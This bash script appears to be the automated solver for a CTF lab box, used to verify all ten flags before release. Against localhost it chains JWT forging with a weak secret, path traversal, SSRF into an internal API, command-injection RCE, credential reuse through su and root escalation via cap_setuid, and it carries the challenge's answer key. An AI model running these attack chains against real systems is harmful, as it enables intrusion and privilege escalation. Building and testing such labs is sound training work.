#!/bin/bash
# Automated end-to-end solver, used only to prove the box is solvable
# before publishing it. Requires: curl, python3 with pyjwt, docker (to
# read the pcap via the container's own scapy -- no host scapy needed).
set -euo pipefail
cd "$(dirname "$0")/.."

HOST=localhost
PORT=8003
BASE="http://$HOST:$PORT"
CONTAINER="halcyon-intermediate-portside"
JWT_SECRET="letmein"
INTERNAL_TOKEN="diag-9f3a-internal"

source .env
export CTF_SECRET

check() {
    local n="$1" got="$2"
    local want
    want=$(python3 -c "
import os, hmac, hashlib
secret = os.environ['CTF_SECRET']
d = hmac.new(secret.encode(), f'intermediate-portside:$n'.encode(), hashlib.sha256).hexdigest()
print(f'HLC{{{d[:10]}}}')")
    if [ "$got" = "$want" ]; then
        echo "flag $n: OK ($got)"
    else
        echo "flag $n: MISMATCH got='$got' want='$want'" >&2
        exit 1
    fi
}

WORK=$(mktemp -d)
trap 'rm -rf "$WORK"' EXIT

ADMIN_JWT=$(python3 -c "import jwt; print(jwt.encode({'role':'admin'}, '$JWT_SECRET', algorithm='HS256'))")

# 1
F1=$(curl -s "$BASE/docs" | grep -oE 'HLC\{[a-f0-9]{10}\}')
check 1 "$F1"

# 2 (Werkzeug debug traceback source disclosure)
F2=$(curl -s "$BASE/manifest/abc" | grep -oE 'HLC\{[a-f0-9]{10}\}' | head -1)
check 2 "$F2"

# 3 (JWT payload decode, no cracking)
TOKEN=$(curl -s "$BASE/guest-token" | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")
F3=$(python3 -c "
import jwt
print(jwt.decode('$TOKEN', options={'verify_signature': False})['note'])
")
check 3 "$F3"

# 4 (forged admin JWT via cracked weak HS256 secret)
F4=$(curl -s -H "Authorization: Bearer $ADMIN_JWT" "$BASE/admin/dashboard" | grep -oE 'HLC\{[a-f0-9]{10}\}')
check 4 "$F4"

# 5 (LFI / path traversal)
F5=$(curl -s "$BASE/reports?file=../config/secrets.txt" | grep -oE 'HLC\{[a-f0-9]{10}\}')
check 5 "$F5"

# 6 (SSRF to the never-published internal diagnostics API)
F6=$(curl -s --get --data-urlencode "url=http://127.0.0.1:5001/status" "$BASE/preview" | grep -oE 'HLC\{[a-f0-9]{10}\}')
check 6 "$F6"

# 7 (SSRF pivot + command injection RCE, gated by the token leaked via flag 5's LFI)
F7=$(curl -s --get --data-urlencode "url=http://127.0.0.1:5001/run?cmd=cat+/opt/portside/flag7.txt&token=$INTERNAL_TOKEN" "$BASE/preview")
check 7 "$F7"

# 8 (pcap analysis -- read via the container's own scapy; also recovers dockworker's password)
ADMIN_JWT_FOR_PCAP="$ADMIN_JWT"
curl -s -H "Authorization: Bearer $ADMIN_JWT_FOR_PCAP" "$BASE/incident-capture.pcap" -o "$WORK/capture.pcap"
docker cp "$WORK/capture.pcap" "$CONTAINER:/tmp/solve_capture.pcap" >/dev/null
PCAP_BODY=$(docker exec "$CONTAINER" /opt/venv/bin/python3 -c "
from scapy.all import rdpcap
pkts = rdpcap('/tmp/solve_capture.pcap')
for p in pkts:
    if p.haslayer('Raw'):
        print(bytes(p['Raw'].load).decode())
")
F8=$(echo "$PCAP_BODY" | grep -oE 'HLC\{[a-f0-9]{10}\}')
DOCKWORKER_PW=$(echo "$PCAP_BODY" | sed -n 's/.*dockworker_password=\(.*\)/\1/p' | tr -d '\r')
check 8 "$F8"

# 9 (credential-reuse su pivot, through the same SSRF+RCE chain)
F9=$(curl -s --get --data-urlencode "url=http://127.0.0.1:5001/run?cmd=echo+$DOCKWORKER_PW+|+su+dockworker+-c+'cat+/home/dockworker/flag9.txt'&token=$INTERNAL_TOKEN" "$BASE/preview")
check 9 "$F9"

# 10 (Linux capability misconfig -- cap_setuid on python3 -- via the same RCE)
F10=$(curl -s --get --data-urlencode "url=http://127.0.0.1:5001/run?cmd=python3+-c+%22import+os;os.setuid(0);print(open('/root/flag10.txt').read())%22&token=$INTERNAL_TOKEN" "$BASE/preview")
check 10 "$F10"

echo
echo "All 10 flags verified end-to-end."
